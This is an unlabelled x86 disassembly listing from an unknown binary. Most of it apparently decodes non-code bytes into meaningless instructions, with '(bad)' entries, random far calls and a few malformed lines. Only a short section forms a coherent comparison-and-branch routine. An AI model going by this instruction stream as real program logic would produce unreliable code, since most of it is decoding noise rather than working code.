  403afb:	fstp   DWORD PTR [eax+edx*2-0x6ca651ce]
  403b02:	push   ebp
  403b03:	and    DWORD PTR [edx+0x42],0x1d
  403b07:	out    dx,al
  403b08:	add    DWORD PTR [ecx+ecx*2-0x3a4821f1],esp
  403b0f:	outs   dx,DWORD PTR ds:[esi]
  403b10:	shr    DWORD PTR [ebx-0x47],0x9e
  403b14:	mov    bh,BYTE PTR ds:0x982f93fe
  403b1a:	pop    ss
  403b1b:	jp     0x403af2
  403b1d:	lods   al,BYTE PTR ds:[esi]
  403b1e:	lds    eax,FWORD PTR [edx-0x10]
  403b21:	dec    esi
  403b22:	js     0x403ae6
  403b24:	loop   0x403ad1
  403b26:	xchg   edi,eax
  403b27:	sbb    eax,0xc69f6f0e
  403b2c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403b2d:	scas   al,BYTE PTR es:[edi]
  403b2e:	cwde   
  403b2f:	hlt    
  403b30:	cmp    edi,DWORD PTR [edx]
  403b32:	paddd  mm4,QWORD PTR [ecx]
  403b35:	dec    ebx
  403b36:	cdq    
  403b37:	mov    dl,0x59
  403b39:	jbe    0x403ac2
  403b3b:	fild   WORD PTR [eax+0x6a85828b]
  403b41:	adc    BYTE PTR [esi],bl
  403b43:	add    al,0xd1
  403b45:	push   ecx
  403b46:	ds sbb al,0x92
  403b49:	call   0xdf7d:0xb56a10b4
  403b50:	enter  0xea03,0xde
  403b54:	push   esp
  403b55:	shr    edi,0xa6
  403b58:	jle    0x403bb7
  403b5a:	das    
  403b5b:	or     esi,DWORD PTR [si-0x1041]
  403b60:	mov    ds:0x917a8767,al
  403b65:	push   ebp
  403b66:	cwde   
  403b67:	leave  
  403b68:	(bad)  
  403b69:	leave  
  403b6a:	adc    DWORD PTR [esi+0x6f],ebx
  403b6d:	inc    ebx
  403b6e:	mov    bh,0xd3
  403b70:	and    esp,edx
  403b72:	loope  0x403bd9
  403b74:	gs cld 
  403b76:	mov    ebp,0x7f66a5ec
  403b7b:	adc    edi,DWORD PTR [ecx]
  403b7d:	xor    BYTE PTR [esi],0x8b
  403b80:	ds mov cl,0xf5
  403b83:	gs cmp bl,bh
  403b86:	inc    eax
  403b87:	out    0xca,al
  403b89:	fwait
  403b8a:	xchg   edi,eax
  403b8b:	sub    al,0x58
  403b8d:	push   ebx
  403b8e:	outs   dx,BYTE PTR ds:[esi]
  403b8f:	inc    eax
  403b90:	mul    DWORD PTR [ebx+0x6a]
  403b93:	fs add esp,ebx
  403b96:	mov    edi,0xd517acd8
  403b9b:	dec    esi
  403b9c:	pop    esp
  403b9d:	xor    DWORD PTR [edx+0x5356118e],0x6e5e99b2
  403ba7:	fnstcw WORD PTR [edx+0x1b79fc13]
  403bad:	stos   DWORD PTR es:[edi],eax
  403bae:	loop   0x403c07
  403bb0:	and    esi,edx
  403bb2:	fisttp QWORD PTR [edi-0x1930eab5]
  403bb8:	jmp    0xdc19f986
  403bbd:	in     al,dx
  403bbe:	cdq    
  403bbf:	ss (bad) 
  403bc2:	sbb    BYTE PTR [edi+0x7bf647c0],0x51
  403bc9:	aam    0x40
  403bcb:	in     eax,dx
  403bcc:	jg     0x403c08
  403bce:	out    dx,al
  403bcf:	imul   ecx,ebp,0xffffffe7
  403bd2:	loop   0x403b98
  403bd4:	in     al,0x83
  403bd6:	mov    bl,0x50
  403bd8:	pop    es
  403bd9:	dec    ebp
  403bda:	enter  0x246e,0x90
  403bde:	ins    BYTE PTR es:[edi],dx
  403bdf:	and    cl,BYTE PTR [ecx+0x7c]
  403be2:	and    eax,0x6f4c84f8
  403be7:	mov    ch,dl
  403be9:	(bad)  
  403beb:	cmp    al,0x42
  403bed:	pusha  
  403bee:	xchg   ecx,eax
  403bef:	addr16 cs jns 0x403bed
  403bf3:	inc    esp
  403bf4:	call   0x2d1e:0x3b856184
  403bfb:	sub    esi,edx
  403bfd:	outs   dx,BYTE PTR ds:[esi]
  403bfe:	(bad)  
  403bff:	jmp    0x403c66
  403c01:	lods   eax,DWORD PTR ds:[esi]
  403c02:	test   eax,0x2c84d4ce
  403c07:	push   eax
  403c08:	data16 jbe 0x403c89
  403c0b:	cmp    al,0xe1
  403c0e:	ret    0x431f
  403c11:	out    0x20,al
  403c13:	test   BYTE PTR [ebp*4-0xc145e3f],0x72
  403c1b:	ins    BYTE PTR es:[edi],dx
  403c1c:	scas   eax,DWORD PTR es:[edi]
  403c1d:	out    dx,al
  403c1e:	pop    ss
  403c1f:	add    al,0x9b
  403c21:	inc    eax
  403c22:	(bad)  
  403c23:	mov    eax,0xacc30160
  403c28:	int    0xe7
  403c2a:	push   0x1e001798
  403c2f:	sub    al,0x90
  403c31:	pop    esp
  403c32:	adc    al,0xa5
  403c34:	mov    ebx,0xcb8f4c0a
  403c39:	shl    dh,0xe1
  403c3c:	push   eax
  403c3d:	xor    eax,0x667be3d2
  403c42:	es in  eax,dx
  403c44:	imul   eax,DWORD PTR [ebp-0x1266e393],0xfbca1fdc
  403c4e:	and    BYTE PTR [ecx+0x34f93926],al
  403c54:	pop    eax
  403c55:	mov    al,0x3
  403c57:	sub    cl,cl
  403c59:	pop    edx
  403c5a:	xchg   BYTE PTR [edi],cl
  403c5c:	ss ds in al,0x1c
  403c60:	push   0x3b7c9376
  403c65:	aam    0x19
  403c67:	sbb    DWORD PTR [ecx],0x843f898c
  403c6d:	cdq    
  403c6e:	or     ebp,esp
  403c70:	sub    eax,0x8d3de3f8
  403c75:	lods   eax,DWORD PTR ds:[esi]
  403c76:	pop    edi
  403c77:	sbb    edi,ecx
  403c79:	push   ds
  403c7a:	dec    eax
  403c7b:	mov    ecx,0x90ba097a
  403c80:	push   edx
  403c81:	lds    ebp,FWORD PTR [ebp+0x2fb5b0e8]
  403c87:	inc    edi
  403c88:	mov    bh,0x68
  403c8a:	ins    DWORD PTR es:[edi],dx
  403c8b:	dec    ebx
  403c8c:	daa    
  403c8d:	adc    edx,DWORD PTR [edi]
  403c8f:	cmc    
  403c90:	inc    ecx
  403c91:	pop    ss
  403c92:	call   FWORD PTR [eax-0x221fe0be]
  403c98:	popf   
  403c99:	pop    ss
  403c9a:	(bad)  
  403c9b:	cmp    edx,edx
  403c9d:	fdivr  st,st(3)
  403c9f:	dec    eax
  403ca0:	repz pop ebx
  403ca2:	shl    DWORD PTR [eax-0x4c],0x81
  403ca6:	jno    0x403c37
  403ca8:	jge    0x403c35
  403caa:	inc    esi
  403cab:	je     0x403cff
  403cad:	ds xor eax,esp
  403cb0:	int3   
  403cb1:	loop   0x403c5d
  403cb3:	mov    ebp,0x8cc62465
  403cb8:	push   eax
  403cb9:	mov    al,ds:0xa7e006dc
  403cbe:	in     eax,dx
  403cbf:	fwait
  403cc0:	push   edi
  403cc1:	fstp   TBYTE PTR [edx+esi*8+0x53]
  403cc5:	outs   dx,BYTE PTR ds:[esi]
  403cc6:	adc    cl,dl
  403cc8:	adc    BYTE PTR [edx-0x5b],bl
  403ccb:	sub    eax,DWORD PTR [eax]
  403ccd:	add    eax,0x7976dc8c
  403cd2:	scas   eax,DWORD PTR es:[edi]
  403cd3:	dec    edi
  403cd4:	aam    0x34
  403cd6:	jmp    0x403c60
  403cd8:	add    eax,DWORD PTR [ebx+eax*4+0x56]
  403cdc:	ror    DWORD PTR [edi],1
  403cde:	stos   BYTE PTR es:[edi],al
  403cdf:	pop    ds
  403ce0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403ce1:	retf   
  403ce2:	stc    
  403ce3:	(bad)  
  403ce4:	out    dx,eax
  403ce5:	pushf  
  403ce6:	mov    cl,0x3a
  403ce8:	or     BYTE PTR [ebp+ebx*4-0x4f],dh
  403cec:	jl     0x403cce
  403cee:	pushf  
  403cef:	cmc    
  403cf0:	loope  0x403cd8
  403cf2:	imul   BYTE PTR [edx-0x6fb397f6]
  403cf8:	mov    eax,0x274a0efd
  403cfd:	jg     0x403d61
  403cff:	inc    ecx
  403d00:	cwde   
  403d01:	shr    DWORD PTR [ebp-0x22],0x41
  403d05:	push   esi
  403d06:	int    0xc0
  403d08:	xchg   ebp,eax
  403d09:	jns    0x403d71
  403d0b:	aad    0x6f
  403d0d:	xlat   BYTE PTR ds:[ebx]
  403d0e:	cmp    DWORD PTR [esi+edx*8-0x19da7567],esi
  403d15:	dec    ebx
  403d16:	or     DWORD PTR [ebx+0xbfc2dec],ebp
  403d1c:	loop   0x403ce7
  403d1e:	cmp    BYTE PTR [ebp-0x62],ah
  403d21:	sbb    BYTE PTR [edx+0x14],0x99
  403d25:	in     eax,0xc4
  403d27:	fcmovnu st,st(0)
  403d29:	les    edx,FWORD PTR [edx+0x7a]
  403d2c:	ret    
  403d2d:	inc    esp
  403d2e:	cmc    
  403d2f:	stc    
  403d30:	call   ebp
  403d32:	(bad)  
  403d33:	fld    QWORD PTR [eax]
  403d35:	adc    DWORD PTR [eax],eax
  403d37:	loopne 0x403ce0
  403d39:	inc    ebp
  403d3a:	mov    dh,0xec
  403d3c:	pop    ebx
  403d3d:	call   0x6727e71e
  403d42:	jae    0x403db7
  403d44:	ins    DWORD PTR es:[edi],dx
  403d45:	mov    ebp,0x43a99966
  403d4a:	adc    dl,BYTE PTR [eax-0x628d1a3e]
  403d50:	retf   0x3f40
  403d53:	cdq    
  403d54:	adc    eax,0xf39bf783
  403d59:	xor    ch,BYTE PTR [ecx]
  403d5b:	test   BYTE PTR [eax+ebx*1+0xc],ch
  403d5f:	push   edi
  403d60:	int    0x38
  403d62:	mov    esp,0x52ce5422
  403d67:	jg     0x403db7
  403d69:	fadd   DWORD PTR [esi+0x2e25e50c]
  403d6f:	sbb    eax,0xd87e2951
  403d74:	or     al,0x79
  403d76:	fadd   DWORD PTR [ebx+0x42e73b98]
  403d7c:	aas    
  403d7d:	xchg   edi,eax
  403d7e:	mov    edx,DWORD PTR [eax-0x41]
  403d81:	scas   eax,DWORD PTR es:[edi]
  403d82:	pop    eax
  403d83:	(bad)  
  403d85:	mov    cl,0xaa
  403d87:	xchg   edx,eax
  403d88:	out    dx,al
  403d89:	mov    eax,0x58f1ddaf
  403d8e:	ret    0x916c
  403d91:	add    BYTE PTR [ebx+0x6b],0xdd
  403d95:	loope  0x403dc7
  403d97:	jle    0x403dd6
  403d99:	or     ebp,ebp
  403d9b:	mov    dl,dh
  403d9d:	add    al,0xc4
  403d9f:	push   esi
  403da0:	push   0xe0f2283d
  403da5:	test   eax,0xbf458212
  403daa:	mov    gs,WORD PTR [eax]
  403dac:	xor    al,0x23
  403dae:	push   ecx
  403daf:	push   ebx
  403db0:	and    al,0x43
  403db2:	retw   0x33be
  403db6:	scas   al,BYTE PTR es:[edi]
  403db7:	aas    
  403db8:	adc    al,0x47
  403dba:	and    al,0xb2
  403dbc:	mov    ebx,DWORD PTR [ebp-0x10]
  403dbf:	sub    ebx,edi
  403dc1:	cmp    ebx,edx
  403dc3:	ja     0x403dd1
  403dc9:	mov    edx,DWORD PTR [ebp-0x28]
  403dcc:	jmp    0x404176
  403dd1:	mov    edx,DWORD PTR [ebp-0x30]
  403dd4:	mov    edi,DWORD PTR [ebp-0x4]
  403dd7:	xor    edx,eax
  403dd9:	xor    edi,eax
  403ddb:	add    edi,ecx
  403ddd:	add    edx,ecx
  403ddf:	imul   edx,edi
  403de2:	mov    edi,DWORD PTR [ebp-0x8]
  403de5:	mov    ebx,DWORD PTR [ebp-0x10]
  403de8:	sub    ebx,edi
  403dea:	cmp    ebx,edx
  403dec:	ja     0x403dfa
  403df2:	mov    edx,DWORD PTR [ebp-0x2c]
  403df5:	jmp    0x404176
  403dfa:	mov    edx,DWORD PTR [ebp-0x34]
  403dfd:	mov    edi,DWORD PTR [ebp-0x4]
  403e00:	xor    edx,eax
  403e02:	xor    edi,eax
  403e04:	add    edi,ecx
  403e06:	add    edx,ecx
  403e08:	imul   edx,edi
  403e0b:	mov    edi,DWORD PTR [ebp-0x8]
  403e0e:	mov    ebx,DWORD PTR [ebp-0x10]
  403e11:	sub    ebx,edi
  403e13:	cmp    ebx,edx
  403e15:	ja     0x403e23
  403e1b:	mov    edx,DWORD PTR [ebp-0x30]
  403e1e:	jmp    0x404176
  403e23:	mov    edx,DWORD PTR [ebp-0x38]
  403e26:	mov    edi,DWORD PTR [ebp-0x4]
  403e29:	xor    edx,eax
  403e2b:	xor    edi,eax
  403e2d:	add    edi,ecx
  403e2f:	add    edx,ecx
  403e31:	imul   edx,edi
  403e34:	mov    edi,DWORD PTR [ebp-0x8]
  403e37:	mov    ebx,DWORD PTR [ebp-0x10]
  403e3a:	sub    ebx,edi
  403e3c:	cmp    ebx,edx
  403e3e:	ja     0x403e4c
  403e44:	mov    edx,DWORD PTR [ebp-0x34]
  403e47:	jmp    0x404176
  403e4c:	mov    edx,DWORD PTR [ebp-0x3c]
  403e4f:	mov    edi,DWORD PTR [ebp-0x4]
  403e52:	xor    edx,eax
  403e54:	xor    edi,eax
  403e56:	add    edx,ecx
  403e58:	add    edi,ecx
  403e5a:	imul   edx,edi
  403e5d:	mov    edi,DWORD PTR [ebp-0x8]
  403e60:	mov    ebx,DWORD PTR [ebp-0x10]
  403e63:	jmp    0x404166
  403e68:	mov    dh,0x45
  403e6a:	xchg   edi,eax
  403e6b:	xor    BYTE PTR [ebp+0x50],0xb1
  403e6f:	jno    0x403e18
  403e71:	(bad)  
  403e72:	cs push 0x78
  403e75:	or     esp,DWORD PTR [ebx]
  403e77:	test   al,0xa
  403e79:	pop    ds
  403e7a:	jle    0x403efa
  403e7c:	pop    eax
  403e7d:	jl     0x403efd
  403e7f:	jle    0x403eb8
  403e81:	push   edi
  403e82:	push   edi
  403e83:	shl    esi,cl
  403e85:	jmp    0xcf36:0xc51e506d
  403e8c:	mov    al,ds:0x679092b2
  403e91:	sahf   
  403e92:	cmp    DWORD PTR [eax+0x25c8dc68],esi
  403e98:	xchg   esi,eax
  403e99:	cdq    
  403e9a:	xchg   BYTE PTR [eax],cl
  403e9c:	cmc    
  403e9d:	jbe    0x403e7a
  403e9f:	fbstp  TBYTE PTR [esi+0x7c]
  403ea2:	pop    es
  403ea3:	or     BYTE PTR [edx],dh
  403ea5:	jg     0x403eba
  403ea7:	adc    eax,0xcf9190cb
  403eac:	mov    ah,0xe
  403eae:	adc    al,0xa
  403eb0:	test   al,0xf6
  403eb2:	ins    DWORD PTR es:[edi],dx
  403eb3:	(bad)  
  403eb4:	sub    eax,0x33bf1d40
  403eb9:	jecxz  0x403f37
  403ebb:	dec    eax
  403ebc:	pushf  
  403ebd:	push   ds
  403ebe:	inc    esi
  403ebf:	mov    esi,0xaf17208e
  403ec4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403ec5:	dec    ebp
  403ec6:	stos   BYTE PTR es:[edi],al
  403ec7:	mov    ah,0x7
  403ec9:	dec    ecx
  403eca:	inc    ebx
  403ecb:	in     al,dx
  403ecc:	in     eax,0x63
  403ece:	enter  0x3ee7,0xbd
  403ed2:	dec    ebp
  403ed3:	retf   0xf570
  403ed6:	iret   
  403ed7:	mov    eax,ds:0x66277a9
  403edc:	sbb    eax,0x4c0b5a7d
  403ee1:	js     0x403eca
  403ee3:	sub    al,0x53
  403ee5:	cmp    bl,bl
  403ee7:	push   eax
  403ee8:	jo     0x403e9a
  403eea:	mov    al,0x39
  403eec:	mov    ds:0x14ae3852,al
  403ef1:	out    0xfb,eax
  403ef3:	mov    ds:0xe37c454c,eax
  403ef8:	mov    WORD PTR [ebp-0x69],gs
  403efb:	mov    eax,0x85bd933c
  403f00:	aaa    
  403f01:	div    BYTE PTR [ebx+0x55bd6049]
  403f07:	int    0x80
  403f09:	push   ds
  403f0a:	in     al,0x2a
  403f0c:	bound  esi,QWORD PTR [ecx-0x49dbeff4]
  403f12:	and    esp,DWORD PTR [edx+edx*2+0x21075d3e]
  403f19:	push   es
  403f1a:	je     0x403ea2
  403f1c:	fcomip st,st(0)
  403f1e:	fstp   TBYTE PTR [ebp-0x5d]
  403f21:	xchg   BYTE PTR [ecx-0x700343fd],dh
  403f27:	(bad)  
  403f28:	leave  
  403f29:	lods   eax,DWORD PTR ds:[esi]
  403f2a:	sti    
  403f2b:	mov    ebp,0x5c88346d
  403f30:	jnp    0x403eef
  403f32:	push   ecx
  403f33:	cs in  al,dx
  403f35:	repnz (bad) 
  403f37:	xor    al,0x3c
  403f39:	adc    BYTE PTR ds:0x7bcc3efa,bh
  403f3f:	mov    bh,0xfa
  403f41:	push   esi
  403f42:	jg     0x403f07
  403f44:	(bad)
  403f47:	jo     0x403f71
  403f49:	or     eax,0xd3b42b86
  403f4e:	xor    DWORD PTR [edi-0x6a],edx
  403f51:	lahf   
  403f52:	lahf   
  403f53:	rol    bh,0xe1
  403f56:	push   es
  403f57:	fstp   QWORD PTR [esi]
  403f59:	arpl   sp,cx
  403f5b:	push   0x6d4e89bc
  403f60:	popa   
  403f61:	(bad)  
  403f63:	cmp    bh,bh
  403f65:	jp     0x403fb3
  403f67:	arpl   bp,si
  403f69:	test   BYTE PTR [ebp+0x1375a990],0x69
  403f70:	add    esp,DWORD PTR [ecx+0x6168cf0]
  403f76:	sbb    eax,0x892f3294
  403f7b:	loop   0x403f0e
  403f7d:	jl     0x403f71
  403f7f:	lock scas eax,DWORD PTR es:[edi]
  403f81:	loopne 0x404001
  403f83:	sbb    DWORD PTR [edi+esi*8],eax
  403f86:	inc    ecx
  403f87:	dec    ebp
  403f88:	xchg   ah,dl
  403f8a:	fild   QWORD PTR es:[ebx+0x1e400c0c]
  403f91:	leave  
  403f92:	mov    ds:0xa7b5dc92,al
  403f97:	sbb    DWORD PTR [esi],edi
  403f99:	hlt    
  403f9a:	pop    es
  403f9b:	fidiv  WORD PTR [ebx+0x76]
  403f9e:	or     eax,0xaa2e7ec8
  403fa3:	adc    BYTE PTR [ecx-0x7],bh
  403fa6:	xor    DWORD PTR [ecx-0x53428e2d],esp
  403fac:	dec    ebx
  403fad:	sbb    al,0x98
  403faf:	enter  0xdcd,0xfd
  403fb3:	stos   DWORD PTR es:[edi],eax
  403fb4:	adc    al,0x2e
  403fb6:	sbb    DWORD PTR [edx+esi*2-0x29],esi
  403fba:	dec    edx
  403fbb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403fbc:	call   0x5192ad54
  403fc1:	test   eax,0xd733cc37
  403fc6:	inc    ecx
  403fc7:	mov    ds:0xf4b4ff7a,al
  403fcc:	xor    DWORD PTR [esi],ebx
  403fce:	hlt    
  403fcf:	mov    ds:0xf3837fd6,eax
  403fd4:	dec    ebx
  403fd5:	jp     0x403f9f
  403fd7:	scas   eax,DWORD PTR es:[di]
  403fd9:	shl    BYTE PTR [eax-0x7dc1c65d],cl
  403fdf:	sbb    al,BYTE PTR [esi+0x726cf47f]
  403fe5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403fe6:	mov    cl,0x22
  403fe8:	push   0x2
  403fea:	mov    ecx,0x89f0a61d
  403fef:	stos   BYTE PTR es:[edi],al
  403ff0:	sbb    dl,cl
  403ff2:	sub    esp,edi
  403ff4:	xor    DWORD PTR [edx+0x78],ebp
  403ff7:	dec    bl
  403ff9:	push   0xfffffff3
  403ffb:	or     eax,0x3a416cbe
  404000:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404001:	ins    DWORD PTR es:[edi],dx
  404002:	cmp    eax,0x19c58a4e
  404007:	ins    BYTE PTR es:[edi],dx
  404008:	out    dx,eax
  404009:	mov    eax,0xaf29608
  40400e:	jmp    0x403fa5
  404010:	test   eax,0x823a6db2
  404015:	inc    eax
  404016:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404017:	aaa    
  404018:	mov    BYTE PTR [edx+ebx*8-0x5390e3da],0x81
  404020:	nop
  404021:	outs   dx,BYTE PTR ds:[esi]
  404022:	lea    esi,[eax]
  404024:	dec    esp
  404025:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404026:	cmp    dh,BYTE PTR [edx]
  404028:	adc    eax,0x54d53b0c
  40402d:	bound  eax,QWORD PTR [ebx-0x452c1337]
  404033:	jmp    0x4840:0x52177b8
  40403a:	push   eax
  40403b:	push   edx
  40403c:	fmul   DWORD PTR [ebp-0x12a3a1c2]
  404042:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404043:	out    dx,al
  404044:	or     al,0xff
  404046:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404047:	push   cs
  404048:	out    0xe0,eax
  40404a:	mov    al,0x6b
  40404c:	into   
  40404d:	data16 add al,0xfb
  404050:	cmp    eax,0x85ba36a7
  404055:	push   0x1faf4042
  40405a:	sub    al,0xff
  40405c:	push   edi
  40405d:	mov    cl,0x35
  40405f:	icebp  
  404060:	fwait
  404061:	push   esp
  404062:	pop    es
  404063:	mov    ah,0x63
  404065:	sti    
  404066:	pop    ds
  404067:	js     0x40404a
  404069:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40406a:	jp     0x40404f
  40406c:	mov    cl,0xec
  40406e:	pop    ecx
  40406f:	push   ecx
  404070:	xor    dh,BYTE PTR [ecx-0x56]
  404073:	fadd   DWORD PTR [edx-0x74d48ea6]
  404079:	mov    eax,0x9b013a4b
  40407e:	clc    
  40407f:	in     eax,0x65
  404081:	xchg   esi,eax
  404082:	mov    al,ds:0xd2304f42
  404087:	pause  
  404089:	xor    BYTE PTR [eax+0x3fa6bd2b],dl
  40408f:	hlt    
  404090:	mov    esi,0x2ce24e0f
  404095:	fs dec esi
  404097:	fidivr DWORD PTR ds:0xd5e88899
  40409d:	push   esp
  40409e:	sub    al,0xb5
  4040a0:	rol    DWORD PTR [ebx-0x38],1
  4040a3:	mov    dh,0x3
  4040a5:	shr    ebp,cl
  4040a7:	outs   dx,DWORD PTR ds:[esi]
  4040a8:	adc    al,BYTE PTR [ebx+0x4e71cb24]
  4040ae:	or     eax,0x2dbf3bbe
  4040b3:	lea    edi,[ebx+0x4a]
  4040b6:	lods   eax,DWORD PTR ds:[esi]
  4040b7:	jns    0x4040be
  4040b9:	add    DWORD PTR [ebx],ebx
  4040bb:	mov    es,WORD PTR [ebp+edi*2+0x669041bd]
  4040c2:	mov    esp,DWORD PTR [esi+0x314fed12]
  4040c8:	jmp    0x404103
  4040ca:	(bad)  
  4040cb:	mov    dl,0x64
  4040cd:	jmp    FWORD PTR [edi+edx*1]
  4040d0:	sbb    DWORD PTR ds:0xbe6e32d9,0xe4434b24
  4040da:	mov    WORD PTR [esi],ss
  4040dc:	enter  0xb9ef,0xfa
  4040e0:	mov    bl,0x58
  4040e2:	mov    dh,0xca
  4040e4:	shr    DWORD PTR [ebx+0x3f],1
  4040e7:	fiadd  DWORD PTR [edi]
  4040e9:	loope  0x4040a3
  4040eb:	mov    ds:0x7f9f857b,eax
  4040f0:	int3   
  4040f1:	pop    eax
  4040f2:	test   DWORD PTR [ebx],ecx
  4040f4:	jnp    0x404098
  4040f6:	adc    esp,DWORD PTR [ebp-0x67]
  4040f9:	sbb    eax,0x30e4ccd8
  4040fe:	jg     0x404123
  404100:	cmp    BYTE PTR [esi+esi*8-0x1a],ah
  404104:	adc    al,0xa3
  404106:	xlat   BYTE PTR ds:[ebx]
  404107:	in     al,dx
  404108:	mov    ecx,0xddd4230e
  40410d:	cmp    cl,BYTE PTR [edi-0xf4c04ed]
  404113:	and    al,bl
  404115:	mov    ebx,DWORD PTR [edi]
  404117:	sub    BYTE PTR [esi-0x2b],ch
  40411a:	cmp    esp,DWORD PTR [ebx-0x3d451dcb]
  404120:	add    eax,0x435503ec
  404125:	jge    0x4040b9
  404127:	sub    bh,ah
  404129:	test   eax,0x7c7a556f
  40412e:	(bad)  
  40412f:	sbb    al,0xef
  404131:	push   cs
  404132:	outs   dx,BYTE PTR ds:[esi]
  404133:	xchg   ebp,eax
  404134:	jg     0x40413c
  404136:	icebp  
  404137:	adc    eax,ebp
  404139:	aam    0x10
  40413b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40413c:	sub    ebp,DWORD PTR [esp+edi*4-0x64]
  404140:	int3   
  404141:	pop    esi
  404142:	fidiv  DWORD PTR [ebx-0x29397cba]
  404148:	pushf  
  404149:	jo     0x4040f6
  40414b:	sub    dh,bh
  40414d:	shr    BYTE PTR [ebp+0x45],cl
  404150:	adc    esi,DWORD PTR [esi]
  404152:	retf   
  404153:	inc    esp
  404154:	sahf   
  404155:	scas   eax,DWORD PTR es:[edi]
  404156:	loopne 0x404168
  404158:	sbb    BYTE PTR [ecx-0x48],ch
  40415b:	fcom   DWORD PTR [ebx]
  40415d:	inc    ebx
  40415e:	jbe    0x40419c
  404160:	or     dh,0x29
  404163:	popa   
  404164:	add    dl,bl
  404166:	sub    ebx,edi
  404168:	cmp    ebx,edx
  40416a:	mov    edx,DWORD PTR [ebp-0x38]
  40416d:	jbe    0x404176
  404173:	mov    edx,DWORD PTR [ebp-0x3c]
  404176:	mov    edi,DWORD PTR [ebp-0x4]
  404179:	jmp    0x40447c
  40417e:	mov    al,0x3b
  404180:	aaa    
  404181:	or     BYTE PTR [ebp-0x10],dh
  404184:	mov    cl,0x63
  404186:	sub    DWORD PTR [edi],0xffffffd4
  404189:	xor    dh,al
  40418b:	pop    ebx
  40418c:	dec    edx
  40418d:	enter  0x1d74,0x7e
  404191:	jle    0x4041eb
  404193:	jl     0x404213
  404195:	jle    0x404187
  404197:	fcomp  DWORD PTR [edx-0x64]
  40419a:	xor    al,0xe1
  40419c:	out    dx,eax
  40419d:	xchg   esp,eax
  40419e:	mov    ch,0x67
  4041a0:	or     edi,DWORD PTR [edi-0x678ff255]
  4041a6:	xchg   ebp,eax
  4041a7:	mov    eax,?
  4041a9:	adc    ebx,ebx
  4041ab:	int3   
  4041ac:	aas    
  4041ad:	pop    edx
  4041ae:	push   0x166e801
  4041b3:	loopne 0x4041a8
  4041b5:	aam    0x3a
  4041b7:	sbb    eax,0x7fd7d921
  4041bc:	mov    al,ds:0xb2194df2
  4041c1:	inc    ebx
  4041c2:	not    DWORD PTR [ebp-0x22]
  4041c5:	push   edx
  4041c6:	jo     0x404239
  4041c8:	icebp  
  4041c9:	std    
  4041ca:	mov    eax,0x46d1fad3
  4041cf:	popf   
  4041d0:	pop    ebp
  4041d1:	xor    al,cl
  4041d3:	addr16 pop ebp
  4041d5:	mov    ebp,0xd8f79951
  4041da:	push   ds
  4041db:	std    
  4041dc:	dec    esi
  4041dd:	fcmovb st,st(5)
  4041df:	(bad)  
  4041e0:	cmp    DWORD PTR [ecx],esp
  4041e2:	push   ss
  4041e3:	and    esp,DWORD PTR [ebx+eax*8]
  4041e6:	jne    0x40424b
  4041e8:	push   0xb10cb464
  4041ed:	int3   
  4041ee:	adc    ecx,esi
  4041f0:	cld    
  4041f1:	jge    0x40424a
  4041f3:	or     DWORD PTR [edx],eax
  4041f5:	pop    ebp
  4041f6:	sbb    BYTE PTR [eax-0x3a],ch
  4041f9:	mov    BYTE PTR [eax+ecx*4],dl
  4041fc:	mov    bh,0x70
  4041fe:	adc    al,BYTE PTR [esi+0x40a36b96]
  404204:	cmp    cl,BYTE PTR [ebx]
  404206:	mov    cl,0x75
  404208:	inc    ebp
  404209:	mov    cl,0xab
  40420b:	xchg   ebx,eax
  40420c:	popa   
  40420d:	xor    DWORD PTR [ecx+0x40],ebx
  404210:	xor    al,0x6d
  404212:	add    BYTE PTR [edx-0x514245b3],cl
  404218:	sub    ebx,DWORD PTR [edx+0x60]
  40421b:	inc    eax
  40421c:	and    DWORD PTR [ebp-0x6af7dd3c],ebx
  404222:	xchg   edi,eax
  404223:	int3   
  404224:	inc    ebx
  404225:	scas   al,BYTE PTR es:[edi]
  404226:	jae    0x404255
  404228:	sbb    esp,esi
  40422a:	lods   al,BYTE PTR ds:[esi]
  40422b:	add    al,0x54
  40422d:	(bad)  
  40422e:	sub    edx,ebp
  404230:	leave  
  404231:	call   0x9a17:0x783323e1
  404238:	mov    esi,0x50754b90
  40423d:	add    eax,0x1bbee7db
  404242:	dec    esi
  404243:	sub    al,0xad
  404245:	into   
  404246:	add    DWORD PTR [eax+0x57],eax
  404249:	rcl    DWORD PTR [edi],0x19
  40424c:	dec    edi
  40424d:	sbb    DWORD PTR [esi-0x71f6ee01],0x33
  404254:	jl     0x4042a2
  404256:	sbb    BYTE PTR ds:0x75825c4,cl
  40425c:	inc    ebx
  40425d:	pop    eax
  40425e:	pop    ds
  40425f:	mov    dh,0xf7
  404261:	ins    DWORD PTR es:[edi],dx
  404262:	mov    eax,ds:0xd6cfa0f
  404267:	jmp    0x92162c7f
  40426c:	lea    eax,[esi-0x26fe0f21]
  404272:	mov    WORD PTR [ecx+0x73],es
  404275:	mov    ch,0x33
  404277:	mov    esp,?
  404279:	or     cl,BYTE PTR [esi]
  40427b:	push   edi
  40427c:	jo     0x7eaae02e
  404282:	(bad)  
  404283:	repnz inc DWORD PTR [ebx+0x4d]
  404287:	jmp    0xd0f054ad
  40428c:	int    0x40
  40428e:	push   es
  40428f:	rcl    dh,1
  404291:	adc    cl,0x70
  404294:	cli    
  404295:	push   edx
  404296:	bound  esp,QWORD PTR [ebx]
  404298:	in     al,dx
  404299:	pushw  es
  40429b:	aaa    
  40429c:	cmp    eax,0x5aaca8f
  4042a1:	test   DWORD PTR [esi-0x29],esi
  4042a4:	jb     0x4042fd
  4042a6:	shr    DWORD PTR [edi-0x6d],1
  4042a9:	nop
  4042aa:	xchg   edx,eax
  4042ab:	pop    esi
  4042ac:	xchg   BYTE PTR [ecx+edi*8+0x2],al
  4042b0:	push   0x3241767d
  4042b5:	add    ebx,DWORD PTR [ebx]
  4042b7:	es jecxz 0x404335
  4042ba:	lock mov cl,0x74
  4042bd:	sub    BYTE PTR [edi+0x7fb52da5],dl
